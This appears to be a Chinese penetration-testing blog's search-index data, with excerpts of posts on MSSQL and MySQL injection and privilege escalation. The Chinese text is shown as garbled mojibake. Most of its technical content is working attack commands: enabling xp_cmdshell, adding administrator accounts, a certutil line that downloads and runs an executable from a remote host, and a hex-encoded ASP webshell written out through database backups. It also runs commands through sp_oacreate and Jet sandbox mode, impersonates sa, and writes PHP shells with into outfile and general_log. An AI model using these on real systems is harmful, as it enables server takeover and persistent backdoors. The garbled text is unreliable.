xp_cmdshellã€xp_dirtreeã€xp_dirtreeã€xp_subdirs execute master..xp_dirtree 'c:' //åˆ—å‡ºæ‰€æœ‰ c:\\ æ–‡ä»¶å’Œç›®å½•,å­ç›®å½• execute master..xp_dirtree 'c:',1 //åªåˆ— c:\\ æ–‡ä»¶å¤¹ execute master..xp_dirtree 'c:',1,1 //åˆ— c:\\ æ–‡ä»¶å¤¹åŠ æ–‡ä»¶ é€šè¿‡æ‰§è¡Œ xp_dirtree è¿”å›æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ï¼Œå¦‚æœæ²¡æœ‰å›æ˜¾çš„è¯ï¼Œå¯ä»¥è¿™æ ·åˆ›å»ºä¸€ä¸ªä¸´æ—¶çš„è¡¨æ’å…¥ id=1;CREATE TABLE tmp (dir varchar(8000),num int,num1 int); id=1;insert into tmp(dir,num,num1) execute master..xp_dirtree 'c:',1,1 xp_cmdshell å¯»æ‰¾è·¯å¾„ï¼š è¿™ä¸ª xp_cmdshell æ‰¾èµ·æ¥æ›´åŠ æ–¹ä¾¿æˆ‘ä»¬è°ƒç”¨cmdçš„å‘½ä»¤å»æœç´¢ï¼Œæ¯”å¦‚æˆ‘çš„webç›®å½•æœ‰ä¸ª1.aspx C:\\Users\\Gee\u003efor /r c:\\ %i in (1*.aspx) do @echo %i c:\\www\\1.aspx æ‰€ä»¥åªéœ€è¦å»ºç«‹ä¸€ä¸ªè¡¨ï¼Œå­˜åœ¨ä¸€ä¸ª char å­—æ®µå°±å¯ä»¥äº†ã€‚ id=1;CREATE TABLE cmdtmp (dir varchar(8000)); id=1;insert into cmdtmp(dir) exec master..xp_cmdshell 'for /r c:\\ %i in (1*.aspx) do @echo %i' ä¿¡æ¯ SQL Server é˜»æ­¢äº†å¯¹ç»„ä»¶ xp_cmdshell çš„è¿‡ç¨‹ sys.xp_cmdshell çš„è®¿é—®ï¼Œå› ä¸ºæ­¤ç»„ä»¶å·²ä½œä¸ºæ­¤æœåŠ¡å™¨å®‰å…¨é…ç½®çš„ä¸€éƒ¨åˆ†è€Œè¢«å…³é—­ã€‚ç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥é€šè¿‡ä½¿ç”¨ sp_configure å¯ç”¨ã€‚ å¦‚æœé‡åˆ° xp_cmdshell ä¸èƒ½è°ƒç”¨ï¼ŒæŠ¥é”™ï¼Œå¯ç”¨å¦‚ä¸‹å‘½ä»¤æ¢å¤ï¼š // å…è®¸ä¿®æ”¹é«˜çº§å‚æ•° ;EXEC sp_configure 'show advanced options',1;RECONFIGURE; // æ‰“å¼€xp_cmdshell æ‰©å±• ;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;-- 5.1.2 å·®å¼‚å¤‡ä»½ // å®Œæ•´å¤‡ä»½ä¸€æ¬¡(ä¿å­˜ä½ç½®å¯ä»¥æ”¹) backup database åº“å to disk = 'c:\\bak.bak';-- create table [dbo].[test] ([cmd] [image]); // åˆ›å»ºè¡¨ cmd å¹¶æ’å…¥ä¸€å¥è¯æœ¨é©¬ insert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E) // è¿›è¡Œå·®å¼‚å¤‡ä»½ backup database åº“å to disk='C:\\d.asp' WITH DIFFERENTIAL,FORMAT;-- å·®å¼‚å¤‡ä»½æœ‰å¤šç§æƒ…å†µå¯èƒ½ä¸æˆåŠŸï¼Œä¸€èˆ¬å°±æ˜¯ç›®å½•æƒé™çš„é—®é¢˜ï¼Œç¬¬ä¸€æ¬¡å¤‡ä»½çš„ç›®å½•æ˜¯å¦å¯èƒ½æ²¡æœ‰æƒé™ï¼Œç¬¬äºŒæ¬¡å¤‡ä»½åˆ°ç½‘ç«™ç›®å½•æ˜¯å¦æœ‰æƒé™ï¼Œæ‰€ä»¥ä¸€èˆ¬ä¸è¦ç›´æ¥å¤‡ä»½åˆ° c ç›˜æ ¹ç›®å½• å½“è¿‡æ»¤äº†ç‰¹æ®Šçš„å­—ç¬¦æ¯”å¦‚å•å¼•å·ï¼Œæˆ–è€…è·¯å¾„ç¬¦å·éƒ½å¯ä»¥ä½¿ç”¨å‰é¢æåˆ°çš„å®šä¹‰å±€éƒ¨å˜é‡æ¥æ‰§è¡Œã€‚ 5.1.3 LOG å¤‡ä»½ LOG å¤‡ä»½éœ€è¦å…ˆæŠŠæŒ‡å®šçš„æ•°æ®åº“æ¿€æ´»ä¸ºè¿˜åŸæ¨¡å¼ï¼Œæ‰€ä»¥éœ€è¦æ‰§è¡Œalter database XXX set RECOVERY FULï¼Œè€Œå·®å¼‚å¤‡ä»½ä¸éœ€è¦ï¼Œæ‰€ä»¥åªæœ‰è¿™æ¡è¯­å¥çš„å°±æ˜¯ LOG å¤‡ä»½ LOG å¤‡ä»½çš„è¦æ±‚æ˜¯ç›®æ ‡æœºå™¨çš„æ•°æ®åº“å¤‡ä»½è¿‡ï¼Œè€Œä¸”é€‰æ‹©æ¢å¤æ¨¡å¼å¾—æ˜¯å®Œæ•´æ¨¡å¼ï¼Œä½†æ˜¯ä½¿ç”¨ log å¤‡ä»½æ–‡ä»¶ä¼šå°çš„å¤šï¼Œå½“ç„¶å¦‚æœä½ çš„æƒé™å¤Ÿé«˜å¯ä»¥è®¾ç½®ä»–çš„æ¢å¤æ¨¡å¼ã€‚ alter database åº“å set RECOVERY FULL create table cmd (a image) backup log åº“å to disk = 'c:\\xxx' with init insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) backup log åº“å to disk = 'c:\\xxx\\2.asp' ç›¸å¯¹äºå·®å¼‚å¤‡ä»½ï¼Œlog å¤‡ä»½çš„å¥½å¤„å°±æ˜¯å¤‡ä»½å‡ºæ¥çš„ webshell çš„æ–‡ä»¶å¤§å°éå¸¸çš„å°ã€‚ ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:5:1","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"5.2 xp_cmdshell æµ‹è¯• xp_cmdshell æ˜¯å¦å¯ä»¥æ‰§è¡Œ exec master..xp_cmdshell 'ver' æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ· exec master.dbo.xp_cmdshell 'net user q 123456q /add' exec master.dbo.xp_cmdshell 'net localgroup administrators q /add' è¿œç¨‹ä¸‹è½½æ–‡ä»¶ï¼Œä¸Šé©¬ exec master.dbo.xp_cmdshell 'cd c:\\www \u0026 certutil -urlcache -split -f http://192.168.130.142:80/download/file.exe'; exec master.dbo.xp_cmdshell 'cd c:\\www \u0026 file.exe'; ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:5:2","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"5.3 sp_oacreate å½“ xp_cmdshell è¢«åˆ é™¤å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ¥ææƒè¯•è¯•ï¼Œæ¢å¤ sp_oacreate EXEC sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'show advanced options', 0; sp_oacreate æ˜¯ä¸€ä¸ªéå¸¸å±é™©çš„å­˜å‚¨è¿‡ç¨‹å¯ä»¥åˆ é™¤ã€å¤åˆ¶ã€ç§»åŠ¨æ–‡ä»¶ã€‚è¿˜èƒ½é…åˆ sp_oamethod æ¥å†™æ–‡ä»¶æ‰§è¡Œ cmdã€‚ æœ‰ä»¥ä¸‹å‡ ç§åˆ©ç”¨æ€è·¯ï¼š è°ƒç”¨ cmd æ¥æ‰§è¡Œå‘½ä»¤ wscript.shell æ‰§è¡Œå‘½ä»¤ declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c xxx' Shell.Application æ‰§è¡Œå‘½ä»¤ declare @o int exec sp_oacreate 'Shell.Application', @o out exec sp_oamethod @o, 'ShellExecute',null, 'cmd.exe','cmd /c net user \u003ec:\\test.txt','c:\\windows\\system32','','1'; å†™å…¥å¯åŠ¨é¡¹ declare @sp_passwordxieo int, @f int, @t int, @ret int exec sp_oacreate 'scripting.filesystemobject', @sp_passwordxieo out exec sp_oamethod @sp_passwordxieo, 'createtextfile', @f out, 'd:\\RECYCLER\\1.vbs', 1 exec @ret = sp_oamethod @f, 'writeline', NULL,'set wsnetwork=CreateObject(\"WSCRIPT.NETWORK\")' exec @ret = sp_oamethod @f, 'writeline', NULL,'os=\"WinNT://\"\u0026wsnetwork.ComputerName' exec @ret = sp_oamethod @f, 'writeline', NULL,'Set ob=GetObject(os)' exec @ret = sp_oamethod @f, 'writeline', NULL,'Set oe=GetObject(os\u0026\"/Administrators,group\")' exec @ret = sp_oamethod @f, 'writeline', NULL,'Set od=ob.Create(\"user\",\"123$\")' exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetPassword \"123\"' exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetInfo' exec @ret = sp_oamethod @f, 'writeline', NULL,'Set of=GetObject(os\u0026\"/123$\",user)' exec @ret = sp_oamethod @f, 'writeline', NULL,'oe.add os\u0026\"/123$\"'; ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:5:3","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"5.4 æ²™ç›’ææƒ æ²™ç›’æ¨¡å¼æ˜¯æ•°æ®åº“çš„ä¸€ç§å®‰å…¨åŠŸèƒ½ã€‚åœ¨æ²™ç›’æ¨¡å¼ä¸‹ï¼Œåªå¯¹æ§ä»¶å’Œå­—æ®µå±æ€§ä¸­çš„å®‰å…¨ä¸”ä¸å«æ¶æ„ä»£ç çš„è¡¨è¾¾å¼æ±‚å€¼ã€‚å¦‚æœè¡¨è¾¾å¼ä¸ä½¿ç”¨å¯èƒ½ä»¥æŸç§æ–¹å¼æŸåæ•°æ®çš„å‡½æ•°æˆ–å±æ€§ï¼Œåˆ™å¯è®¤ä¸ºå®ƒæ˜¯å®‰å…¨çš„ã€‚ ä½¿ç”¨åœºæ™¯ï¼šæ— æ³•æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œxp_regwrite å¯ç”¨(ä½¿ç”¨æ¡ä»¶) å¼€å¯æ²™ç›’æ¨¡å¼ï¼š exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',1 SandBoxModeå‚æ•°å«ä¹‰ï¼ˆé»˜è®¤æ˜¯2ï¼‰ 0ï¼šåœ¨ä»»ä½•æ‰€æœ‰è€…ä¸­ç¦æ­¢å¯ç”¨å®‰å…¨æ¨¡å¼ 1 ï¼šä¸ºä»…åœ¨å…è®¸èŒƒå›´å†… 2 ï¼šå¿…é¡»åœ¨accessæ¨¡å¼ä¸‹ 3ï¼šå®Œå…¨å¼€å¯ åˆ©ç”¨ jet.oledb æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ·»åŠ ç”¨æˆ· select * from openrowset('microsoft.jet.oledb.4.0' ,';database=c:\\windows\\system32\\ias\\ias.mdb' ,'select shell(\"cmd.exe /c net user q 123456q /add\")') å°† q ç”¨æˆ·æ·»åŠ è‡³ç®¡ç†å‘˜ç»„ select * from openrowset('microsoft.jet.oledb.4.0' ,';database=c:\\windows\\system32\\ias\\ias.mdb' ,'select shell(\"cmd.exe /c net localgroup administrators q /add\")') ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:5:4","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"5.5 åˆ©ç”¨ mssql æ¨¡æ‹Ÿç™»å½•ææƒ å¼€å‘è€…æœ‰æ—¶ä¸ºäº†æ»¡è¶³æŸç§éœ€æ±‚ï¼Œå…è®¸å…¶ä»–ç™»å½•ç”¨æˆ·æ¨¡æ‹Ÿé«˜æƒé™çš„ç”¨æˆ·ï¼Œå¯¹äºå¼€å‘æ¥è¯´ï¼Œä¸€ä¸ªå†ç®€å•ä¸è¿‡çš„åŠŸèƒ½ã€‚è™½ç„¶ä¸¥æ ¼æ„ä¹‰ä¸Šè¿™ä¸ç®—ä¸ªæ¼æ´ï¼Œä½†æ˜¯è¿™ç§é…ç½®ä¸å½“ä¸€èˆ¬å¯ä»¥ç”¨æ¥ææƒã€‚ 5.5.1 èµ‹äºˆç”¨æˆ· MyUser1 æƒé™æ¥æ¨¡æ‹Ÿ MyUser2, MyUser3,åŠsa USE master; GRANT IMPERSONATE ON LOGIN::sa to [MyUser1]; GRANT IMPERSONATE ON LOGIN::MyUser2 to [MyUser1]; GRANT IMPERSONATE ON LOGIN::MyUser3 to [MyUser1]; GO 5.5.2 æŸ¥æ‰¾å¯ä»¥æ¨¡æ‹Ÿç™»å½•çš„ç”¨æˆ· é»˜è®¤æƒ…å†µä¸‹ï¼Œç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥æ¨¡æ‹Ÿä»»ä½•äººï¼Œä½†æ˜¯æ­£å¸¸ç™»å½•å¿…é¡»åˆ†é…æƒé™æ¥æ¨¡æ‹Ÿç‰¹å®šçš„ç”¨æˆ·ï¼Œä½¿ç”¨ MyUser1 ç”¨æˆ·ç™»å½•ï¼Œæ‰“å¼€æ–°å»ºæŸ¥è¯¢ï¼Œæ‰§è¡Œä¸‹é¢è¯­å¥æŸ¥è¯¢é‚£äº›ç”¨æˆ·å¯ä»¥ç”¨æ¥æ¨¡æ‹Ÿç™»å½• SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° MyUser1 ç”¨æˆ·å¯ä»¥æ¨¡æ‹Ÿç™»å½• sa, MyUser2, MyUser2 ç”¨æˆ·ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ¨¡æ‹Ÿç™»å½• sa æ¥è·å– sysadmin æƒé™äº† 5.5.3 æ¨¡æ‹Ÿ SQL Server ç”¨æˆ·ç™»é™† -- éªŒè¯æ˜¯å¦ä¸ºsysadminæƒé™ SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin') -- æ¨¡æ‹Ÿsaç™»å½• EXECUTE AS LOGIN = 'sa' -- éªŒè¯æ˜¯å¦ä¸ºsysadminæƒé™ SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin') 5.3.4 PS å·¥å…·åŒ– å½“ç„¶è¿™ä¸ªä¹Ÿå¯ä»¥ç”¨ powershell ä¸€é”®å®ç°ï¼šè„šæœ¬åœ°å€ ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:5:5","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"6 CLR ææƒ é€šè¿‡å›é¡¾å¸¸è§çš„æ‰‹æ³•ï¼Œå¯ä»¥çœ‹å‡ºï¼Œåœ¨ç›®æ ‡ç³»ç»Ÿè¯¥åšå®‰å…¨é˜²æŠ¤éƒ½åšäº†çš„æƒ…å†µä¸‹ï¼Œé™¤äº†å¤‡ä»½æ‹¿ shell ä¹‹å¤–ï¼Œå…¶å®ƒçš„æ“ä½œå‡éœ€è¦ sysadmin æœåŠ¡å™¨è§’è‰²ã€‚ å¯¹äºéƒ¨åˆ†å¸¸è§æ‰‹æ³•çš„é˜²æŠ¤ï¼Œç½‘ä¸Šæå‡ºäº†ä¸€äº›æç«¯çš„ä¿®å¤æ–¹æ³•ï¼Œæ¯”å¦‚å°†å­˜å‚¨è¿‡ç¨‹å’Œå…¶ç›¸å…³çš„ DLL æ–‡ä»¶åˆ é™¤ï¼Œå…¶å®ƒåŠŸèƒ½å¯èƒ½åˆ é™¤ï¼Œä½†æ˜¯åˆ é™¤ CLR å¯èƒ½æ€§åº”è¯¥ä¸å¤§ï¼Œä¸”ä¸è®ºç¦ç”¨æˆ–è€…åˆ é™¤ .net ä¹‹å SQL Server è¿˜èƒ½ä¸èƒ½æ­£å¸¸è¿è¡Œï¼ŒSQL CLR åŠŸèƒ½å¼ºå¤§ï¼Œå¼€å‘ä¹Ÿå¯èƒ½ä½¿ç”¨å®ƒå¼€å‘æ­£å¸¸åŠŸèƒ½ï¼Œåˆ é™¤æ— å¼‚äºè‡ªåºŸæ­¦åŠŸã€‚ ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:6:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"6.1 SQL Server CLR ä»‹ç» å…¬å…±è¯­è¨€è¿è¡Œåº“(Common Language Runtimeï¼ŒCLR)æ˜¯æ•´ä¸ª .NET æ¡†æ¶çš„æ ¸å¿ƒï¼Œå®ƒä¸º .NET åº”ç”¨ç¨‹åºæä¾›äº†ä¸€ä¸ªæ‰˜ç®¡çš„ä»£ç æ‰§è¡Œç¯å¢ƒã€‚å®ƒå®é™…ä¸Šæ˜¯é©»ç•™åœ¨å†…å­˜é‡Œçš„ä¸€æ®µä»£ç†ä»£ç ï¼Œ è´Ÿè´£åº”ç”¨ç¨‹åºåœ¨æ•´ä¸ªæ‰§è¡ŒæœŸé—´çš„ä»£ç ç®¡ç†å·¥ä½œï¼Œæ¯”è¾ƒå…¸å‹çš„æœ‰ï¼šå†…å­˜ç®¡ç†ã€çº¿ç¨‹ç®¡ç†ã€å®‰å…¨ç®¡ç†ã€è¿œç¨‹ç®¡ç†ã€å³ä½¿ç¼–è¯‘ã€ä»£ç å¼ºåˆ¶å®‰å…¨ç±»æ£€æŸ¥ç­‰ï¼Œè¿™äº›éƒ½å¯ä»¥æˆä¸º .NET æ¡†æ¶çš„ç”Ÿå‘½çº¿ã€‚ é€šä¿—æ¥è®² CLR å°±æ˜¯ .NET ç¨‹åºè¿è¡Œçš„åŸºç¡€ã€‚ SQL Server ä¸­çš„ CLR SQL CLR æ˜¯ SQL Server2005 å‡ºç°çš„æ–°åŠŸèƒ½ï¼Œå®ƒå°† .NET Framework ä¸­çš„ CLR æœåŠ¡æ³¨å…¥åˆ° SQL Server ä¸­ï¼Œè®© SQL Server çš„éƒ¨åˆ†æ•°æ®åº“å¯¹è±¡å¯ä»¥ä½¿ç”¨ .NET Framework çš„ç¼–ç¨‹è¯­è¨€è¿›è¡Œå¼€å‘(ç›®å‰åªæ”¯æŒVB.NETå’ŒC#)ï¼ŒåŒ…æ‹¬å­˜å‚¨è¿‡ç¨‹ã€ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ã€è§¦å‘å™¨ã€ ç”¨æˆ·è‡ªå®šä¹‰ç±»å‹ä»¥åŠç”¨æˆ·è‡ªå®šä¹‰èšåˆå‡½æ•°ç­‰åŠŸèƒ½ã€‚ SQL Server çš„ CLR è®©æˆ‘ä»¬å¯ä»¥ç”¨ C# æˆ–è€… VB å¼€å‘å­˜å‚¨è¿‡ç¨‹ã€ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ã€è§¦å‘å™¨ã€ç”¨æˆ·è‡ªå®šä¹‰ç±»å‹ä»¥åŠç”¨æˆ·è‡ªå®šä¹‰èšåˆå‡½æ•°ã€‚ä½†æ˜¯æˆ‘ä»¬æœ€å®¹æ˜“åˆ©ç”¨çš„æ˜¯å­˜å‚¨è¿‡ç¨‹å’Œè§¦å‘å™¨ã€‚è§¦å‘å™¨æœ‰ DDL è§¦å‘å™¨å’Œ DML è§¦å‘å™¨ä¸¤ç§ï¼ŒDDL è§¦å‘å™¨å¯¹åº”çš„è¯­å¥è¯­å¥ä¸»è¦ä»¥ CREATEã€ALTER å’Œ DROP å¼€å¤´ï¼ŒDML è§¦å‘å™¨å¯¹åº”çš„è¯­å¥ä¸»è¦æ˜¯ INSERTã€UPDATE æˆ– DELETEï¼Œç›¸æ¯”è€Œè¨€ DML è§¦å‘å™¨æ›´å¯æ§ã€‚ å‚è€ƒï¼š https://xz.aliyun.com/t/8195 https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI SQL Serverçš„CLRåœ¨æ¸—é€æµ‹è¯•ä¸­çš„åº”ç”¨ ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:6:1","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MSSQL æ³¨å…¥ä¸ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"MySQL ææƒæ–¹æ³•æ•´ç†","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MySQL ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"MySQL ææƒæ–¹æ³•æ•´ç† ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:0:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MySQL ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"1 Initial Access ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:1:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MySQL ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"1.1 æ•°æ®åº“æƒé™ æ‹¿åˆ°æ•°æ®åº“æ“ä½œæƒé™çš„æ–¹æ³•æ— å¤–ä¹æœ‰ä»¥ä¸‹å‡ ç§ï¼š 3306 å¼±å£ä»¤çˆ†ç ´ sqlmap çš„ â€“sql-shell æ¨¡å¼ ç½‘ç«™çš„æ•°æ®åº“é…ç½®æ–‡ä»¶ä¸­æ‹¿åˆ°æ˜æ–‡å¯†ç ä¿¡æ¯ mysql 1day æ¼æ´è·å–æƒé™ ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:1:1","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"MySQL ææƒæ–¹æ³•æ•´ç†","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•","å¸¸ç”¨"],"content":"1.2 webshell æƒé™ å‰æ å·²çŸ¥ç½‘ç«™ç‰©ç†è·¯å¾„ä¸”è¯¥è·¯å¾„æœ‰å†™æƒé™ é«˜æƒé™æ•°æ®åº“ç”¨æˆ· secure_file_priv æ— é™åˆ¶ mysql\u003e show global variables like '%secure_file_priv%'; +------------------+-------+ | Variable_name | Value | +------------------+-------+ | secure_file_priv | | +------------------+-------+ åœ¨ MySQL 5.5 ä¹‹å‰ secure_file_priv é»˜è®¤æ˜¯ç©ºï¼Œè¿™ä¸ªæƒ…å†µä¸‹å¯ä»¥å‘ä»»æ„ç»å¯¹è·¯å¾„å†™æ–‡ä»¶ åœ¨ MySQL 5.5ä¹‹å secure_file_priv é»˜è®¤æ˜¯ NULLï¼Œè¿™ä¸ªæƒ…å†µä¸‹ä¸å¯ä»¥å†™æ–‡ä»¶ å…·ä½“åŸç†åœ¨ã€ŒSQL æ³¨å…¥ç›¸å…³ã€æ–‡ç« ä¸­å·²æœ‰è¯¦è¿°ï¼Œä¸åœ¨æ­¤èµ˜è¿°ã€‚ 1.2.1 into outfile å†™æ–‡ä»¶ select '\u003c?php phpinfo(); ?\u003e' into outfile '/var/www/html/info.php'; sqlmap ä¸‹å¯ä»¥æ‰§è¡Œå¦‚ä¸‹æ“ä½œï¼š sqlmap -u \"http://x.x.x.x/?id=x\" --file-write=\"/path/to/shell.php\" --file-dest=\"/var/www/html/test/shell.php\" ä¸€èˆ¬æƒ…å†µä¸‹ Linux ç³»ç»Ÿä¸‹é¢æƒé™åˆ†é…æ¯”è¾ƒä¸¥æ ¼ï¼ŒMySQL ç”¨æˆ·ä¸€èˆ¬æƒ…å†µä¸‹æ˜¯æ— æ³•ç›´æ¥å¾€ç«™ç‚¹æ ¹ç›®å½•å†™å…¥æ–‡ä»¶çš„ï¼Œè¿™ç§æƒ…å†µä¸‹åœ¨ Windows ç¯å¢ƒä¸‹æˆåŠŸç‡ä¼šå¾ˆé«˜ã€‚ 1.2.2 terminated by å†™æ–‡ä»¶ ?id=1 limit 1 into outfile 'C:/wamp64/www/work/webshell.php' lines terminated by '\u003c?php phpinfo() ?\u003e'; 1.2.3 general log å†™æ–‡ä»¶ MySQL 5.0 ç‰ˆæœ¬ä»¥ä¸Šä¼šåˆ›å»ºæ—¥å¿—æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹æ—¥å¿—çš„å…¨å±€å˜é‡æ¥ getshell ä¿¡æ¯ general_log é»˜è®¤å…³é—­ï¼Œå¼€å¯å®ƒå¯ä»¥è®°å½•ç”¨æˆ·è¾“å…¥çš„æ¯æ¡å‘½ä»¤ï¼Œä¼šæŠŠå…¶ä¿å­˜åœ¨å¯¹åº”çš„æ—¥å¿—æ–‡ä»¶ä¸­ã€‚ mysql\u003e SHOW VARIABLES LIKE 'general%'; +------------------+---------------------------------+ | Variable_name | Value | +------------------+---------------------------------+ | general_log | OFF | | general_log_file | /var/lib/mysql/c1595d3a029a.log | +------------------+---------------------------------+ é€šè¿‡å°† general_log å­˜å‚¨ä½ç½®æ”¹ä¸º web ç›®å½•ã€‚åŒæ—¶ï¼Œå‘æ—¥å¿—æ–‡ä»¶é‡Œé¢å†™å…¥å†…å®¹çš„è¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥æˆåŠŸ getshellã€‚ # æ›´æ”¹æ—¥å¿—æ–‡ä»¶ä½ç½® set global general_log = \"ON\"; set global general_log_file='/var/www/html/info.php'; # æŸ¥çœ‹å½“å‰é…ç½® mysql\u003e SHOW VARIABLES LIKE 'general%'; +------------------+-----------------------------+ | Variable_name | Value | +------------------+-----------------------------+ | general_log | ON | | general_log_file | /var/www/html/shell.php | +------------------+-----------------------------+ # å¾€æ—¥å¿—é‡Œé¢å†™å…¥ payload select '\u003c?php phpinfo();?\u003e'; è­¦å‘Š 